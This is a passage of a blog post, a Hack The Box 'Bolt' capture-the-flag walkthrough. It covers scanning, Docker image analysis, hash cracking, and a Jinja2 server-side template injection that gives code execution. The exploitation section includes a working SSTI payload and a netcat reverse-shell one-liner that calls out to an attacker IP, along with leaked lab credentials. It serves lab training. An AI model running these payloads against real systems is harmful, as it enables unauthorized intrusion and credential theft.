@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Bolt Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-02-18-bolt/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Bolt Hackthebox writeup">
+  <meta property="og:description" content="In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost “demo” which has some functions aren’t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-02-18T00:45:12+02:00">
+    <meta property="article:modified_time" content="2022-02-18T00:45:12+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Ssti">
+    <meta property="article:tag" content="PGP Decrypting">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bolt Hackthebox writeup">
+  <meta name="twitter:description" content="In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost “demo” which has some functions aren’t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-02-18-bolt/" /><link rel="prev" href="http://example.org/posts/linux-machines/2022-02-04-horizontall/" /><link rel="next" href="http://example.org/posts/windows-machines/2022-02-25-driver/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Bolt Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-02-18-bolt\/"
+        },"genre": "posts","keywords": "Hackthebox, SSTI, PGP Decrypting","wordcount":  1294 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-02-18-bolt\/","datePublished": "2022-02-18T00:45:12+02:00","dateModified": "2022-02-18T00:45:12+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Bolt Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1294 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning-">Scanning :</a></li>
+    <li><a href="#enumeration-">Enumeration :</a></li>
+    <li><a href="#enumeration-harder">Enumeration Harder</a></li>
+    <li><a href="#exploitation-">exploitation :</a></li>
+    <li><a href="#foothold-">Foothold :</a></li>
+    <li><a href="#eddie-user-">Eddie user :</a>
+      <ul>
+        <li><a href="#decrypting-the-message">Decrypting the message</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-access">Root Access</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost &ldquo;demo&rdquo; which has some functions aren&rsquo;t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .</p>
+<h2 id="scanning-">Scanning :</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -A -T <span class="m">4</span> <span class="nv">$IP</span>  -sV -oN nmap/intial
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title:     Starter Website -  About
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Passbolt <span class="p">|</span> Open <span class="nb">source</span> password manager <span class="k">for</span> teams
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was /auth/login?redirect<span class="o">=</span>%2F
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>passbolt.bolt.htb/organizationName<span class="o">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span class="o">=</span>Some-State/countryName<span class="o">=</span>AU
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-02-24T19:11:23
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-02-24T19:11:23
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<ul>
+<li>
+<p>if we do a full port scan it won&rsquo;t return any new ports so now we can start our enumeration process.</p>
+</li>
+<li>
+<p>we can notice from the nmap scan<code> commonName=passbolt.bolt.htb</code> so we can add
+<code>bolt.htb</code> and <code>pass.bolt.htb </code> to our <code>/etc/hosts</code></p>
+</li>
+<li>
+<p>we can also search for other potential vhosts now :</p>
+</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb -H <span class="s2">&#34;Host: FUZZ.bolt.htb&#34;</span> -fw  <span class="m">10870</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mail                    <span class="o">[</span>Status: 200, Size: 4943, Words: 345, Lines: 99<span class="o">]</span>
+</span></span><span class="line"><span class="cl">demo                    <span class="o">[</span>Status: 302, Size: 219, Words: 22, Lines: 4<span class="o">]</span></span></span></code></pre></div></div>
+<ul>
+<li>we can add them all to the <code>/etc/hosts</code> as well</li>
+</ul>
+<h2 id="enumeration-">Enumeration :</h2>
+<ul>
+<li>visiting the web application at <code>bolt.htb</code> or <code>passbolt.bolt.htb</code> we are introduced with :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224093240.png"
+        data-srcset="/assets/images/Bolt/20220224093240.png, /assets/images/Bolt/20220224093240.png 1.5x, /assets/images/Bolt/20220224093240.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224093240.png"
+        title="error" /></p>
+<ul>
+<li>there is a feedback form at the end but it doesn&rsquo;t work</li>
+<li>we can start viewing the pages at the application :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224093405.png"
+        data-srcset="/assets/images/Bolt/20220224093405.png, /assets/images/Bolt/20220224093405.png 1.5x, /assets/images/Bolt/20220224093405.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224093405.png"
+        title="error" /></p>
+<ul>
+<li>at <code>/download</code> there is a file we can download so let&rsquo;s download it and see what it contains</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224093429.png"
+        data-srcset="/assets/images/Bolt/20220224093429.png, /assets/images/Bolt/20220224093429.png 1.5x, /assets/images/Bolt/20220224093429.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224093429.png"
+        title="error" /></p>
+<ul>
+<li>extracting the <code>image.tar</code> we can see it contains :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224093713.png"
+        data-srcset="/assets/images/Bolt/20220224093713.png, /assets/images/Bolt/20220224093713.png 1.5x, /assets/images/Bolt/20220224093713.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224093713.png"
+        title="error" /></p>
+<ul>
+<li>each directory contains a <code>layer.tar </code> file , we can utilize some bash magic to extract them all :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> file in <span class="k">$(</span> ls -d */<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">tar -xf  <span class="nv">$file</span>/layer.tar -C <span class="nv">$file</span>/
+</span></span><span class="line"><span class="cl"><span class="k">done</span></span></span></code></pre></div></div>
+<ul>
+<li>now we can use <code>tree</code> command to have an overview what does the files contains then we can start checking them manually</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224100331.png"
+        data-srcset="/assets/images/Bolt/20220224100331.png, /assets/images/Bolt/20220224100331.png 1.5x, /assets/images/Bolt/20220224100331.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224100331.png"
+        title="error" /></p>
+<p>at <code>745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/</code> will find a <code>config.py</code> file</p>
+<ul>
+<li>reading it will find :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224100409.png"
+        data-srcset="/assets/images/Bolt/20220224100409.png, /assets/images/Bolt/20220224100409.png 1.5x, /assets/images/Bolt/20220224100409.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224100409.png"
+        title="error" /></p>
+<ul>
+<li>and it loads <code>db.sqlite3 </code> we can start searching for it in all image layers maybe we find it and we did :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># under img dir</span>
+</span></span><span class="line"><span class="cl">find . -name db.sqlite3
+</span></span><span class="line"><span class="cl">./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3</span></span></code></pre></div></div>
+<ul>
+<li>now we can open it and will find :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224100831.png"
+        data-srcset="/assets/images/Bolt/20220224100831.png, /assets/images/Bolt/20220224100831.png 1.5x, /assets/images/Bolt/20220224100831.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224100831.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>admin@bolt.htb:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.</code></pre></div>
+<p>we can try to crack this hash with JTR :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt admin@bolt.htb_hash
+</span></span><span class="line"><span class="cl"><span class="c1"># password:deadbolt</span></span></span></code></pre></div></div>
+<p>great we have credentials we can try to login at the web application with it and we are in:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224101458.png"
+        data-srcset="/assets/images/Bolt/20220224101458.png, /assets/images/Bolt/20220224101458.png 1.5x, /assets/images/Bolt/20220224101458.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224101458.png"
+        title="error" /></p>
+<ul>
+<li>let&rsquo;s see where else we can utilize these valid credentials , we can visit <code>mail.bolt.htb </code> but it didn&rsquo;t work :( .</li>
+<li>we can also visit <code>demo.bolt.htb</code> and it also doesn&rsquo;t work however it contains a registration function :</li>
+<li>it needs a ticket to create an account</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224102126.png"
+        data-srcset="/assets/images/Bolt/20220224102126.png, /assets/images/Bolt/20220224102126.png 1.5x, /assets/images/Bolt/20220224102126.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224102126.png"
+        title="error" /></p>
+<ul>
+<li>navigating through img files will see at <code>41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/</code> some source codes we can check <code>routes.py</code> and we will see :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224103501.png"
+        data-srcset="/assets/images/Bolt/20220224103501.png, /assets/images/Bolt/20220224103501.png 1.5x, /assets/images/Bolt/20220224103501.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224103501.png"
+        title="error" /></p>
+<ul>
+<li>seems like invitation code we can try to register at <code>demo.bolt.htb</code> with it .</li>
+<li>we create account successfully and can login with it :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224103833.png"
+        data-srcset="/assets/images/Bolt/20220224103833.png, /assets/images/Bolt/20220224103833.png 1.5x, /assets/images/Bolt/20220224103833.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224103833.png"
+        title="error" /></p>
+<ul>
+<li>we can also login to <code>mail.bolt.htb </code> with our new credentials , they seem to be connected somehow</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224103947.png"
+        data-srcset="/assets/images/Bolt/20220224103947.png, /assets/images/Bolt/20220224103947.png 1.5x, /assets/images/Bolt/20220224103947.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224103947.png"
+        title="error" /></p>
+<h2 id="enumeration-harder">Enumeration Harder</h2>
+<ul>
+<li>now as we are logged in in all the web applications we should have notice that <code>demo.bolt.htb</code> and <code>bolt.htb</code> are pretty much the same however in the <code>demo</code> there are more features and pages we can access .</li>
+<li>we now are searching for any input at any page to test it</li>
+<li>at demo and under profile page we have this setting tab which has input option :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224104439.png"
+        data-srcset="/assets/images/Bolt/20220224104439.png, /assets/images/Bolt/20220224104439.png 1.5x, /assets/images/Bolt/20220224104439.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224104439.png"
+        title="error" /></p>
+<ul>
+<li>we can test it</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224104528.png"
+        data-srcset="/assets/images/Bolt/20220224104528.png, /assets/images/Bolt/20220224104528.png 1.5x, /assets/images/Bolt/20220224104528.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224104528.png"
+        title="error" /></p>
+<ul>
+<li>and instantly at <code>mail.bolt.htb</code> an email has received</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224104619.png"
+        data-srcset="/assets/images/Bolt/20220224104619.png, /assets/images/Bolt/20220224104619.png 1.5x, /assets/images/Bolt/20220224104619.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224104619.png"
+        title="error" /></p>
+<ul>
+<li>and when we pressed the link another mail has received :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224104701.png"
+        data-srcset="/assets/images/Bolt/20220224104701.png, /assets/images/Bolt/20220224104701.png 1.5x, /assets/images/Bolt/20220224104701.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224104701.png"
+        title="error" /></p>
+<ul>
+<li>so now we have understood how the web applications function together we can test these input fields for potential vulnerabilities .</li>
+<li>we have seen in the source codes &ldquo;flask&rdquo; a lot so we can test <a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee" target="_blank" rel="noopener noreffer ">SSTI</a> .</li>
+</ul>
+<h2 id="exploitation-">exploitation :</h2>
+<p>testing SSTI can began with a basic test like :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224105201.png"
+        data-srcset="/assets/images/Bolt/20220224105201.png, /assets/images/Bolt/20220224105201.png 1.5x, /assets/images/Bolt/20220224105201.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224105201.png"
+        title="error" /></p>
+<ul>
+<li>we now will receive first mail to confirm and 2nd one with the response :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224105326.png"
+        data-srcset="/assets/images/Bolt/20220224105326.png, /assets/images/Bolt/20220224105326.png 1.5x, /assets/images/Bolt/20220224105326.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224105326.png"
+        title="error" /></p>
+<ul>
+<li>Nice we have a valid SSTI exploit at the name field , we can try to leverage it to RCE with payload like <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md" target="_blank" rel="noopener noreffer ">those</a></li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span>.read<span class="o">()</span> <span class="o">}}</span></span></span></code></pre></div></div>
+<p>response :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224105554.png"
+        data-srcset="/assets/images/Bolt/20220224105554.png, /assets/images/Bolt/20220224105554.png 1.5x, /assets/images/Bolt/20220224105554.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224105554.png"
+        title="error" /></p>
+<p>so now we can get a reverse shell with :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span class="o">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ip&gt; 9999 &gt;/tmp/f&#39;</span><span class="o">)</span>.read<span class="o">()</span> <span class="o">}}</span></span></span></code></pre></div></div>
+<h2 id="foothold-">Foothold :</h2>
+<p>and we have our shell as www-data :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224105825.png"
+        data-srcset="/assets/images/Bolt/20220224105825.png, /assets/images/Bolt/20220224105825.png 1.5x, /assets/images/Bolt/20220224105825.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224105825.png"
+        title="error" /></p>
+<ul>
+<li>
+<p>if we look around we will find a lot of files to explore , we can use <strong>Linpeas</strong> to guide us where to look first and non expected files in some directories and if there is a path to escalate our privilege .</p>
+</li>
+<li>
+<p>we can check <code>roundcube/config/config.inc.php</code> and will find :</p>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224120011.png"
+        data-srcset="/assets/images/Bolt/20220224120011.png, /assets/images/Bolt/20220224120011.png 1.5x, /assets/images/Bolt/20220224120011.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224120011.png"
+        title="error" /></p>
+<p>which is a potential password we can use latter</p>
+<ul>
+<li>also there is <code>/etc/passbolt</code> we can check it</li>
+<li>to search for potential passwords in it we can use :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep --color<span class="o">=</span>auto -rnw <span class="s1">&#39;.&#39;</span> -Rie <span class="s2">&#34;password&#34;</span> --color<span class="o">=</span>always 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="c1"># ./passbolt.php:42:            &#39;password&#39; =&gt; &#39;rT2;jW7&lt;eY8!dX8}pQ8%&#39;,</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224114429.png"
+        data-srcset="/assets/images/Bolt/20220224114429.png, /assets/images/Bolt/20220224114429.png 1.5x, /assets/images/Bolt/20220224114429.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224114429.png"
+        title="error" /></p>
+<p>we can try to see if we can access the mysql database :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
